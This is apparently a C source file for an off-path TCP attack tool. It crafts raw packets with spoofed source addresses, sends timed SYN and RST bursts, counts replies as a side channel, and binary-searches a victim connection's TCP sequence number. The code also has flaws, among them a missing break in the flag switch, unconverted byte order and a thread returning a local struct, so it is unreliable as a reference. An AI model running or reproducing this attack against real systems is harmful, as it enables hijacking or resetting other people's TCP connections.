#include "types.h"
void tcp_ip_send(const char* src_ip, int src_port, 
                 const char* dst_ip, int dst_port, const char* data, int mode,
                 int sequenceNumber, int ackNumber, int windowSize);

void err_exit(const char* err_msg){
    perror(err_msg);
    exit(1);
}

long getTime(){
    struct timeval tv;
    gettimeofday(&tv, NULL);
    long now = (1000000 * tv.tv_sec + tv.tv_usec) / 1000;
    return now;
}

void sendPackets(long syncTime, int packetCount, const char* src_ip, int src_port, 
                    const char* dst_ip, int dst_port, const char* data, int mode,
                    int sequenceNumber, int ackNumber, int windowSize){
    
    usleep(syncTime * 1000000);
    int i;
    for(i=0; i<packetCount; i++){
        tcp_ip_send(src_ip, src_port, dst_ip, dst_port, data, mode, 
                        sequenceNumber, ackNumber, windowSize);
        usleep(973000 / packetCount);
    }
}

struct ip *fill_ip_header(const char *src_ip, const char *dst_ip, int ip_packet_len){
    struct ip *ip_header;
    
    ip_header = (struct ip *)malloc(IP_HEADER_LEN);
    ip_header->ip_v = IPVERSION;
    ip_header->ip_hl = sizeof(struct ip) / 4;        
    ip_header->ip_tos = 0;
    ip_header->ip_len = htons(ip_packet_len);        
    ip_header->ip_id = 0;                            
    ip_header->ip_off = 0;
    ip_header->ip_ttl = MAXTTL;
    ip_header->ip_p = IPPROTO_TCP;                   
    ip_header->ip_sum = 0;                           
    ip_header->ip_src.s_addr = inet_addr(src_ip);    
    ip_header->ip_dst.s_addr = inet_addr(dst_ip);    

    return ip_header;
}


struct tcphdr *fill_tcp_header(int src_port, int dst_port, int mode,
								int sequenceNumber, int ackNumber, int windowSize){
    struct tcphdr *tcp_header;

    tcp_header = (struct tcphdr *)malloc(TCP_HEADER_LEN);
    tcp_header->source = htons(src_port); 
    tcp_header->dest = htons(dst_port);
    tcp_header->doff = sizeof(struct tcphdr) / 4;
    tcp_header->seq = sequenceNumber;
    tcp_header->ack_seq = ackNumber;
    tcp_header->window = windowSize;
    tcp_header->check = 0;
    switch(mode){
    	case SYN:
    		tcp_header->syn = 1;
    	case RST:
    		tcp_header->rst = 1;
    }
    return tcp_header;
}

void tcp_ip_send(const char* src_ip, int src_port, 
                 const char* dst_ip, int dst_port, const char* data, int mode,
                 int sequenceNumber, int ackNumber, int windowSize){
    
    struct ip* ip_header;
    struct tcphdr* tcp_header;
    struct sockaddr_in dst_addr;
    socklen_t sock_addrlen = sizeof(struct sockaddr_in);

    int data_len = strlen(data);
    int ip_packet_len = IP_TCP_HEADER_LEN + data_len;
    char buf[ip_packet_len];
    int sock_fd, ret_len, on = 1;

    bzero(&dst_addr, sock_addrlen);
    dst_addr.sin_family = AF_INET;
    dst_addr.sin_addr.s_addr = inet_addr(dst_ip);
    dst_addr.sin_port = htons(dst_port);


    ip_header = fill_ip_header(src_ip, dst_ip, ip_packet_len);
    tcp_header = fill_tcp_header(src_port, dst_port, mode, sequenceNumber, 
    								ackNumber, windowSize);
    bzero(buf, ip_packet_len);

    memcpy(buf, ip_header, IP_HEADER_LEN);
    memcpy(buf + IP_HEADER_LEN, tcp_header, TCP_HEADER_LEN);
    memcpy(buf + IP_TCP_HEADER_LEN, data, data_len);

    if((sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        err_exit("socket() err");
    if(setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)
        err_exit("setsockopt() err");

    ret_len = sendto(sock_fd, buf, ip_packet_len, 0, (struct sockaddr *)&dst_addr, sock_addrlen);
    if(ret_len < 0)
    	err_exit("send failed");
    close(sock_fd);
    free(ip_header);
    free(tcp_header);
}


struct reVal tcp_ip_recv(const char* ip_dst, int port){

    struct ip* ip_header;
    struct tcphdr *tcp_header;
    int sock_raw_fd, ret_len;
    char buf[IP_TCP_BUFF_SIZE];
    if ((sock_raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        err_exit("socket()");

    /*  set to non-blocking mode  */
	fcntl(sock_raw_fd,F_SETFL, O_NONBLOCK);
	/*=========end================*/

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_dst);
    addr.sin_port = htons(port);

    socklen_t sock_addrlen = sizeof(struct sockaddr_in);
    struct reVal val;
    val.packetCount=0; val.x=0; val.y=0;
    int iMode = 1;

    /* add time parameter to count*/
    struct timeval start, end;
    gettimeofday(&start, NULL);
    long interval = 2000000;
    long timeuse;
    /*========end=================*/

    /* receive data */
    do{
    	gettimeofday(&end, NULL);
    	timeuse = (1000000*(end.tv_sec - start.tv_sec) + end.tv_usec - start.tv_usec) ;
    	if(timeuse > interval)
    		break;
        bzero(buf, IP_TCP_BUFF_SIZE);
        
        ret_len = recvfrom(sock_raw_fd, buf, IP_TCP_BUFF_SIZE, 0,
                        (struct sockaddr*)&addr, &sock_addrlen);
        if (ret_len > 0){
            /* ip header */
            ip_header = (struct ip*)buf;
            char recv_addr[32];
            strcpy(recv_addr, inet_ntoa(ip_header->ip_src));
            
            /* tcp header */
            tcp_header = (struct tcphdr*)(buf + IP_HEADER_LEN);
            if((strcmp(recv_addr, ip_dst) == 0) && (ntohs(tcp_header->source) == port)){
                printf("=======================================\n");
                printf("from ip:%s\n", inet_ntoa(ip_header->ip_src));
                printf("from port:%d\n", ntohs(tcp_header->source));
                /* get data */
                printf("get data:%s\n", buf + IP_TCP_HEADER_LEN);
                printf("packet: %d\n", val.packetCount);
                if(timeuse > interval / 2)
                	val.x++;
                else
                	val.y++;
                val.packetCount++;
            }
        }
        else
            continue;

    }while(1);
    
    close(sock_raw_fd);
    return val;
}




void* nonSpoofed(void* parameter){
    struct spoofedStruct* info = (struct spoofedStruct*)parameter;

    sendPackets(info->timeSync, 100, info->src_ip, info->src_port, info->dst_ip, info->dst_port, 
                info->data, RST, info->seq, info->seq, 12600);
    return NULL;
}

void* recvPackets(void* text){

    struct message* msg = (struct message*)text;
    struct reVal val = tcp_ip_recv(msg->src_ip, msg->src_port);
    pthread_exit((void *)&val);
    return NULL;
}

/* time synchronization doing round 1 and 2,
    since round 1 and 2 are pretty much the same*/
void round12(int packetCount, const char* src_ip, int src_port, 
    const char* dst_ip, int dst_port, const char* data, struct reVal* val){

    int i;
    /*using multithreading approach*/
    pthread_t ntid;
    pthread_mutex_t mutex;
    pthread_mutex_init(&mutex, NULL);
    struct message msg;
    strcpy(msg.src_ip, src_ip);
    msg.src_port = src_port;
    int err = pthread_create(&ntid, NULL, recvPackets, (void*)&msg);
    if(err != 0)
        err_exit("create thread error");
    /*=======end======*/

    /* send packets in 1s*/
    for(i=0; i<packetCount; i++){
        tcp_ip_send(src_ip, src_port, dst_ip, dst_port, 
                data, SYN, 0, 0, 29200);
    }
    /*=======end=========*/
    pthread_join(ntid, (void*)val);
    
}

/*  binary search for tcp sequence number */
int binSearch(int left, int right, const char* spoofed_ip, int s_port, 
                 const char* dst_ip, int dst_port, const char* normal_ip, 
                 int n_port, const char* data, long timeSync){
    int templ = left, tempr = right;
    int middle, i;
    struct reVal val;
    while(templ < tempr){
        middle = (templ + tempr) / 2;
         /* create thread to listen port*/
        pthread_t ntid;
        struct message msg;
        strcpy(msg.src_ip, normal_ip);
        
        msg.src_port = templ;
        int err = pthread_create(&ntid, NULL, recvPackets, (void*)&msg);
        if(err != 0)
            err_exit("create thread error");
        /*========end===================*/

        for(i=middle; i<tempr; i++){
            sendPackets(timeSync, i, spoofed_ip, s_port, dst_ip, dst_port,
                        data, RST, templ, templ, 29200);
        }
        sendPackets(timeSync, 100, normal_ip, n_port, dst_ip, dst_port, data, RST, 0, 0, 29200);
        pthread_join(ntid, (void*)&val);
        if(val.packetCount == 100)
            tempr = middle - 1;
        else
            templ = middle;
    }
    return templ;
}
/*==============end===============*/